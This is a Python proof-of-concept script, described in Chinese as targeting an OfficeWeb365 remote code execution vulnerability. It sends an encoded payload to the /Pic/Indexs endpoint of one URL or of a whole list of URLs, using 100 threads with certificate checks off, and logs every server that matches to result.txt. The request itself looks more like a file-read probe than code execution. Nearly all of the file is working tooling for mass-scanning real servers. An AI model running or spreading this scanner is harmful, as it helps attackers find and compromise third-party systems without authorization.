import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """__________________________           ___       __    ______ ________________________
__  __ \__  __/__  __/__(_)____________ |     / /_______  /___|__  /_  ___/__  ____/
_  / / /_  /_ __  /_ __  /_  ___/  _ \_ | /| / /_  _ \_  __ \__/_ <_  __ \______ \  
/ /_/ /_  __/ _  __/ _  / / /__ /  __/_ |/ |/ / /  __/  /_/ /___/ // /_/ / ____/ /  
\____/ /_/    /_/    /_/  \___/ \___/____/|__/  \___//_.___//____/ \____/ /_____/   
                                                                                    """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='OfficeWeb365 远程代码执行漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09'
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding':'gzip, deflate',
        'DNT':'1',
        'Connection':'close',
        'Upgrade-Insecure-Requests':'1',
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
        if res.status_code == 200 and 'fonts' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == '__main__':
    main()